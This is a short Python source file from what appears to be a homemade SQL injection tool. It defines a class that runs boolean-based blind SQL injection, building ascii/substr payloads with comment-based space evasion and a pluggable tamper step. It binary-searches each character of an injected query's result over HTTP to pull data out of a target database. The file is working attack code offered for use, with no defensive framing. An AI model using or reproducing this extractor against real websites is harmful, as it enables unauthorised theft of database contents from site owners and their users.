import requests

from sqli.tamper.Default import default
from sqli.payload import payload


class Booli:
    blindSql = "(ascii(substr(({0})from/**/{1}/**/for/**/1))>{2})"
    method = 'GET'

    def __init__(self, http='', msg='', tamper=default()):
        self.http = http
        self.msg = msg
        self.tamper = tamper

    def get(self, fuckSql):
        result = ''
        for i in range(1, 1024):
            l = 31
            r = 126
            mid = (l + r) >> 1
            while l < r:
                sql = self.blindSql.format(fuckSql, i, mid)
                req = payload(self.http, sql, self.tamper)

                if self.msg in req.result.text:
                    l = mid + 1
                else:
                    r = mid
                mid = (l + r) >> 1
            if mid == 44:
                print(',\n', end='')
            elif mid == 31:
                print()
                break
            else:
                print(chr(mid), end='')
            result += chr(mid)
        return result
